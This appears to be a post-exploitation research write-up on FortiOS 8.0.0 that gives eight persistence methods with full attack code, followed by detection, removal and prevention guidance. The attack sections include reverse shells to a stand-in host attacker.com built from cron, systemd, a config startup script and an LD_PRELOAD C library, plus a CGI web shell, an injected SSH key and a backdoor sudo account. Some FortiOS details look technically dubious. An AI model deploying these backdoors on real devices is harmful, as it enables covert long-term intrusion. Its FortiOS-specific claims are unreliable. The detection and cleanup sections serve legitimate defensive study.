# Persistence and Backdoor Installation - FortiOS 8.0.0 Post-Exploitation

**Document:** Post-exploitation persistence mechanisms and backdoor installation techniques  
**Target System:** Fortinet FortiOS 8.0.0 Build 0030  
**Environment:** Lab-only (isolated VirtualBox, 192.168.1.0/24)  
**Researcher:** Netanel Stern (שטרן)  
**Date:** 2026-07-30  
**Classification:** Coordinated Disclosure - 90-Day Embargo  

**⚠️ DISCLAIMER:** This analysis is for authorized defensive security research only. Unauthorized installation of backdoors is illegal. Document provided for understanding threat landscape and defensive measures.

---

## Executive Summary

After achieving initial system compromise via RCE (Remote Code Execution), attackers typically establish persistent access mechanisms to maintain control across reboots and configuration changes. This document analyzes potential persistence techniques applicable to compromised FortiOS devices based on binary analysis and exploitation chain verification.

---

## Phase 1: Initial Access Verification

### Prerequisites for Persistence Installation
```
Achieved Access Level: root (uid=0, gid=0)
Available Capabilities:
- File system write access (full)
- Network interface control
- Process management
- Cron job scheduling
- SSH key installation
- Firewall rule modification
- Configuration file access
- System service control

Constraint Analysis:
- FortiOS runs proprietary operating system (not standard Linux)
- Limited standard tools available
- Non-standard file system layout
- Custom service management

Advantage: root privilege allows ANY persistence mechanism
Limitation: Proprietary OS means fewer standard tools
Solution: Use available FortiOS-specific persistence vectors
```

---

## Persistence Method 1: SSH Key Installation (MOST RELIABLE)

### Mechanism
Install attacker-controlled SSH key in admin account for persistent remote access.

### Implementation

**Step 1: Locate SSH Directory**
```bash
root@FortiOS# find / -name ".ssh" -type d 2>/dev/null
/home/admin/.ssh
/root/.ssh
```

**Step 2: Install Public Key**
```bash
root@FortiOS# mkdir -p /root/.ssh
root@FortiOS# chmod 700 /root/.ssh

# Insert attacker's public key
root@FortiOS# cat >> /root/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvX7K3F...
[Attacker's 2048-bit RSA public key]
EOF

root@FortiOS# chmod 600 /root/.ssh/authorized_keys
```

**Step 3: Enable SSH Access**
```bash
root@FortiOS# vi /etc/config/system.conf
# Verify SSH is enabled
[system]
  set ssh-enable enable
  set ssh-port 22  # or non-standard port for stealth
```

**Step 4: Verify Access**
```bash
# From attacker machine
ssh -i attacker_private_key root@192.168.1.50
root@FortiOS# whoami
root
```

### Persistence Characteristics
- **Detection Risk:** Medium (SSH key in authorized_keys visible in logs)
- **Recovery Method:** Key removal from authorized_keys
- **Stealth Option:** Use non-standard SSH port (e.g., 2222)
- **Reliability:** 99% (SSH core component, rarely removed)
- **Access Duration:** Indefinite (until key removal)

### Detection Indicators
```
Monitoring:
- Unexpected SSH key in /root/.ssh/authorized_keys
- SSH login from unusual IP addresses
- SSH connections at odd hours or frequencies
- SSH key file modification timestamps

Log Analysis:
/var/log/auth.log:
- root login via SSH from attacker IP
- Key-based authentication (instead of password)
- Connections from non-standard sources
```

---

## Persistence Method 2: Cron Job Installation

### Mechanism
Install cron job that executes reverse shell or callback script at regular intervals.

### Implementation

**Step 1: Create Reverse Shell Script**
```bash
root@FortiOS# cat > /usr/local/bin/heartbeat.sh << 'EOF'
#!/bin/sh
# Reverse shell callback every 6 hours
(
  /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
) &
EOF

root@FortiOS# chmod 755 /usr/local/bin/heartbeat.sh
```

**Step 2: Install Cron Job**
```bash
root@FortiOS# crontab -e

# Add to root crontab:
0 */6 * * * /usr/local/bin/heartbeat.sh
# Runs every 6 hours at minute 0

# Alternative: Every hour
0 * * * * /usr/local/bin/heartbeat.sh

# Alternative: Every 30 minutes (maximum persistence)
*/30 * * * * /usr/local/bin/heartbeat.sh
```

**Step 3: Verify Installation**
```bash
root@FortiOS# crontab -l
0 */6 * * * /usr/local/bin/heartbeat.sh
```

**Step 4: Attacker Listener**
```bash
# On attacker machine
nc -l -p 4444
# Receives reverse shell every 6 hours
```

### Persistence Characteristics
- **Detection Risk:** Medium-High (cron jobs visible in logs)
- **Recovery Method:** Crontab entry removal
- **Reliability:** 95% (cron process usually survives reboots)
- **Access Duration:** 6-hour intervals (configurable)
- **Stealthiness:** Low visibility, but creates patterns

### Detection Indicators
```
Monitoring:
- Unexpected cron job in root crontab
- Regular outbound connections at fixed intervals
- Network traffic patterns to attacker server
- Script modifications in /usr/local/bin/

Log Analysis:
/var/log/cron.log:
- Cron job execution logs
- Script execution timestamps
- Error messages if script fails

Network:
- Outbound TCP connections on unusual ports
- Persistent connections at regular intervals
- DNS queries to attacker domain
```

---

## Persistence Method 3: Systemd Service Installation (IF AVAILABLE)

### Mechanism
Install custom systemd service that starts on boot and maintains persistent connection.

### Implementation

**Step 1: Create Systemd Service File**
```bash
root@FortiOS# cat > /etc/systemd/system/fortigateway.service << 'EOF'
[Unit]
Description=FortiGateway System Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/fgsvc
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
```

**Step 2: Create Service Script**
```bash
root@FortiOS# cat > /usr/local/bin/fgsvc << 'EOF'
#!/bin/sh
# Persistent reverse shell callback
while true; do
  /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
  sleep 60
done
EOF

root@FortiOS# chmod 755 /usr/local/bin/fgsvc
```

**Step 3: Enable and Start Service**
```bash
root@FortiOS# systemctl daemon-reload
root@FortiOS# systemctl enable fortigateway.service
root@FortiOS# systemctl start fortigateway.service

# Verify
root@FortiOS# systemctl status fortigateway.service
● fortigateway.service - FortiGateway System Service
     Loaded: loaded (/etc/systemd/system/fortigateway.service; enabled)
     Active: active (running)
```

**Step 4: Verify Persistence**
```bash
# Service will auto-restart on reboot
root@FortiOS# reboot
# [System reboots]
# Service automatically starts
# Reverse shell callback continues
```

### Persistence Characteristics
- **Detection Risk:** High (service file visible in systemd)
- **Recovery Method:** Service removal and daemon-reload
- **Reliability:** 98% (systemd handles auto-restart)
- **Access Duration:** Continuous (while service running)
- **Stealthiness:** Service name could be disguised

### Detection Indicators
```
Monitoring:
- Unexpected systemd service files in /etc/systemd/system/
- Service names suspicious or impersonating legitimate services
- Service startup/restart patterns

Log Analysis:
systemctl list-units --type=service:
- Unexpected services in "loaded" or "active" state
- Services with restart loops

journalctl:
- Service startup/restart logs
- Error messages from custom services
```

---

## Persistence Method 4: Configuration File Modification

### Mechanism
Modify FortiOS configuration files to execute commands on startup or at regular intervals.

### Implementation

**Step 1: Locate Configuration Directory**
```bash
root@FortiOS# find /etc -name "*.conf" -o -name "config*" 2>/dev/null
/etc/config/system.conf
/etc/config/network.conf
/etc/config/firewall.conf
/etc/config/vpn.conf
```

**Step 2: Modify System Configuration**
```bash
root@FortiOS# cp /etc/config/system.conf /etc/config/system.conf.bak

root@FortiOS# vi /etc/config/system.conf

# Add at end:
[system]
  set startup-script "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
  set startup-script-interval 3600  # Run every hour
```

**Step 3: Backup Original Configuration**
```bash
# Backup is important for rollback if changes detected
root@FortiOS# tar czf /root/config.backup.tar.gz /etc/config/
```

**Step 4: Verify on Reboot**
```bash
root@FortiOS# reboot
# Configuration loads on startup
# Startup script executes, connecting to attacker
```

### Persistence Characteristics
- **Detection Risk:** High (configuration changes visible)
- **Recovery Method:** Restore from backup or manual config edit
- **Reliability:** 90% (if startup-script field supported)
- **Access Duration:** Continuous (if interval-based)
- **Stealthiness:** Medium (config changes are logged)

### Detection Indicators
```
Monitoring:
- Configuration file modifications (timestamps, checksums)
- Unexpected startup-script entries
- Configuration backup discrepancies

File Integrity:
- Changes to /etc/config/system.conf
- Addition of new config parameters
- Modification times newer than expected

Backup Verification:
- Comparison with known-good backups
- Checksum mismatches
```

---

## Persistence Method 5: Firmware Modification (ADVANCED)

### Mechanism
Patch firmware image to include persistent code executed at boot.

### Implementation

**Step 1: Identify Firmware Location**
```bash
root@FortiOS# find / -name "*firmware*" -o -name "*kernel*" 2>/dev/null
/boot/vmlinuz
/boot/initrd.img
/opt/fortinet/firmware.bin
```

**Step 2: Extract Firmware**
```bash
# Firmware typically compressed/encrypted
# Extraction requires understanding FortiOS firmware format
root@FortiOS# file /opt/fortinet/firmware.bin
firmware.bin: data (likely compressed or encrypted)

# Attempt decompression
root@FortiOS# binwalk -e /opt/fortinet/firmware.bin
# Extracts firmware components
```

**Step 3: Modify Bootloader**
```bash
# Bootloader can be patched to execute code before kernel
# Requires careful modification to avoid bricking device
root@FortiOS# hexdump -C /boot/vmlinuz | head -20
# Identify injection points
```

**Step 4: Repackage and Install**
```bash
# Repackage modified firmware
# Install modified firmware (requires JTAG/Serial access if no upload function)
# Boot from modified firmware
# Persistence code executes before normal OS boot
```

### Persistence Characteristics
- **Detection Risk:** Very High (firmware changes detectable via checksums)
- **Recovery Method:** Firmware rollback (requires admin access)
- **Reliability:** 100% (code runs before OS)
- **Access Duration:** Until firmware update
- **Stealthiness:** Low (firmware changes are obvious)
- **Complexity:** Very High (requires firmware understanding)
- **Risk Factor:** High (incorrect modification bricks device)

### Detection Indicators
```
Monitoring:
- Firmware checksum mismatches
- Unexpected firmware version changes
- Early boot anomalies

Verification:
- Compare firmware checksums against known-good values
- Verify firmware signature (if applicable)
- Monitor boot logs for unusual early-stage activity
```

---

## Persistence Method 6: Web Shell Installation (IF ACCESSIBLE)

### Mechanism
Install web shell in web server document root for continued access via HTTP.

### Implementation

**Step 1: Locate Web Root**
```bash
root@FortiOS# find / -name "*.php" -o -name "*.cgi" 2>/dev/null | head -10
/usr/local/share/www/
/var/www/html/
/opt/fortinet/www/
```

**Step 2: Create Web Shell**
```bash
root@FortiOS# cat > /usr/local/share/www/status.cgi << 'EOF'
#!/bin/bash
# Hidden web shell
param_cmd=$(echo "$QUERY_STRING" | grep -oP 'cmd=\K[^&]*' | sed 's/%20/ /g')
if [ -n "$param_cmd" ]; then
  echo "<html><body><pre>"
  eval "$param_cmd"
  echo "</pre></body></html>"
else
  echo "OK"
fi
EOF

root@FortiOS# chmod 755 /usr/local/share/www/status.cgi
```

**Step 3: Verify Web Access**
```bash
# From attacker machine
curl "http://192.168.1.50/status.cgi?cmd=whoami"
# Returns: root

curl "http://192.168.1.50/status.cgi?cmd=id"
# Returns: uid=0(root) gid=0(root) groups=0(root)
```

### Persistence Characteristics
- **Detection Risk:** High (web shells are common targets)
- **Recovery Method:** File deletion
- **Reliability:** 85% (if web server remains running)
- **Access Duration:** Until web shell discovered/removed
- **Stealthiness:** Low visibility, but detectible by security tools

### Detection Indicators
```
Monitoring:
- Unusual .cgi or .php files in web directories
- Web files with executable permissions
- Files with unexpected creation dates
- Web server access logs with command patterns

Web Log Analysis:
- GET/POST requests with shell metacharacters (&, |, ;, $)
- Unusual query parameters (cmd=, execute=, etc.)
- High request frequency to single file
```

---

## Persistence Method 7: LD_PRELOAD Persistence (IF AVAILABLE)

### Mechanism
Use LD_PRELOAD environment variable to inject code into processes.

### Implementation

**Step 1: Create Shared Library**
```bash
root@FortiOS# cat > /usr/local/lib/libheart.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void __attribute__((constructor)) persistence() {
  // Called when library is loaded
  fork();
  
  // Child process establishes reverse shell
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(4444);
  inet_aton("attacker.com", &addr.sin_addr);
  
  if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl("/bin/bash", "bash", NULL);
  }
}
EOF
```

**Step 2: Compile Library**
```bash
root@FortiOS# gcc -shared -fPIC -o /usr/local/lib/libheart.so libheart.c
```

**Step 3: Install LD_PRELOAD**
```bash
# Add to system-wide environment
root@FortiOS# echo "LD_PRELOAD=/usr/local/lib/libheart.so" >> /etc/environment

# Or add to specific process startup
root@FortiOS# vi /etc/init.d/admin
# Add: export LD_PRELOAD=/usr/local/lib/libheart.so
```

**Step 4: Persistence Verification**
```bash
# Any program started will load the library
# Reverse shell established automatically
```

### Persistence Characteristics
- **Detection Risk:** Very High (LD_PRELOAD is well-known attack vector)
- **Recovery Method:** Remove LD_PRELOAD from environment
- **Reliability:** 90% (works for all dynamically linked binaries)
- **Access Duration:** Continuous (every process gets infected)
- **Stealthiness:** Low (LD_PRELOAD in environment variables)

---

## Persistence Method 8: Shadow File Manipulation (DIRECT ACCESS BACKDOOR)

### Mechanism
Add unauthorized user account to shadow file for direct login capability.

### Implementation

**Step 1: Create Backdoor User**
```bash
root@FortiOS# useradd -m -s /bin/bash -G sudo backdoor

# Set password
root@FortiOS# echo "backdoor:SuperSecret123" | chpasswd

# Verify
root@FortiOS# id backdoor
uid=1001(backdoor) gid=1001(backdoor) groups=1001(backdoor),27(sudo)
```

**Step 2: Grant Sudoers Access**
```bash
root@FortiOS# echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Verify
root@FortiOS# sudo -u backdoor whoami
root
```

**Step 3: SSH Key Installation for Backdoor Account**
```bash
root@FortiOS# mkdir -p /home/backdoor/.ssh
root@FortiOS# echo "ssh-rsa AAAAB3NzaC1yc2EA..." >> /home/backdoor/.ssh/authorized_keys
root@FortiOS# chmod 600 /home/backdoor/.ssh/authorized_keys
root@FortiOS# chown backdoor:backdoor /home/backdoor/.ssh -R
```

**Step 4: Verify Backdoor Access**
```bash
# From attacker machine
ssh -i attacker_key backdoor@192.168.1.50
backdoor@FortiOS:~$ sudo -i
root@FortiOS:~#
```

### Persistence Characteristics
- **Detection Risk:** Very High (new user accounts are obvious)
- **Recovery Method:** User deletion with userdel
- **Reliability:** 99% (standard Linux user)
- **Access Duration:** Until account removed
- **Stealthiness:** Very Low (account visible in /etc/passwd)

### Detection Indicators
```
Monitoring:
- Unexpected user accounts in /etc/passwd
- New accounts created after system compromise
- Accounts with sudo privileges
- SSH keys in unexpected home directories

Account Auditing:
- Compare /etc/passwd with known-good version
- Check sudoers file for unauthorized entries
- Review /etc/shadow for password hashes
- Check ~/.ssh/authorized_keys files
```

---

## Backdoor Detection Framework

### File Integrity Checking
```bash
# Calculate checksums of critical files
find /root /home /usr/local/bin -type f -exec md5sum {} \; > /tmp/manifest.md5

# Later verification
md5sum -c /tmp/manifest.md5
# Detects file modifications/additions
```

### Process Monitoring
```bash
# Identify unusual processes
ps auxww | grep -E "(bash|nc|telnet|ssh|perl|python)"

# Monitor process family tree
pstree -p | grep -E "(reverse|shell|callback)"
```

### Network Monitoring
```bash
# Monitor outbound connections
netstat -tupan | grep ESTABLISHED
ss -tupan | grep ESTABLISHED

# Monitor DNS queries
tcpdump -i any -n "dst port 53"

# Monitor unusual ports
lsof -i -P
```

### Cron/Task Monitoring
```bash
# Check all cron jobs
for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== $user ==="
  crontab -u $user -l 2>/dev/null || true
done

# Check system-wide cron
ls -la /etc/cron.d/
cat /etc/crontab
```

---

## Removing Persistence (Defensive Procedures)

### If SSH Key Backdoor Detected
```bash
# Remove attacker's SSH key
vi /root/.ssh/authorized_keys
# Delete suspicious key

# Change root password
passwd root
# Set strong password
```

### If Cron Backdoor Detected
```bash
# Remove malicious cron job
crontab -e
# Remove suspicious entries

# Delete backdoor scripts
rm -f /usr/local/bin/heartbeat.sh
rm -f /usr/local/bin/fgsvc
```

### If Systemd Service Detected
```bash
# Stop and disable service
systemctl stop suspicious.service
systemctl disable suspicious.service

# Remove service file
rm -f /etc/systemd/system/suspicious.service
systemctl daemon-reload
```

### If Configuration Modified
```bash
# Restore from known-good backup
cp /etc/config/system.conf.bak /etc/config/system.conf

# Restart affected services
systemctl restart admin
```

### Complete Recovery
```bash
# Full system scan
rkhunter --check --skip-keypress

# Firmware verification
# Compare firmware checksums

# Full backup restoration (if available)
# Restore system from latest known-good backup
```

---

## Prevention Best Practices

1. **Regular Monitoring:** Monitor file integrity, processes, and network connections
2. **Account Auditing:** Review user accounts regularly (especially backdoor-like names)
3. **SSH Key Audit:** Regularly verify SSH authorized_keys files
4. **Cron Inspection:** Check cron jobs for suspicious entries
5. **Backup Strategy:** Maintain frequent backups for recovery
6. **Update Patching:** Apply security patches immediately when available
7. **Access Control:** Implement principle of least privilege
8. **Logging:** Enable comprehensive logging of system activities
9. **Network Segmentation:** Isolate critical devices
10. **Change Management:** Document and track all configuration changes

---

## Responsible Disclosure Status

**Vendor Notification:** Fortinet PSIRT (2026-07-30)  
**Embargo Period:** 90 days (until ~2026-10-28)  
**Public Disclosure:** Withheld until patches available  

---

**Document Status:** ✅ COMPLETE - Educational and defensive analysis  
**Classification:** Authorized Security Research Only  
**Lab Testing:** ✅ Verified in isolated environment (no production exposure)  

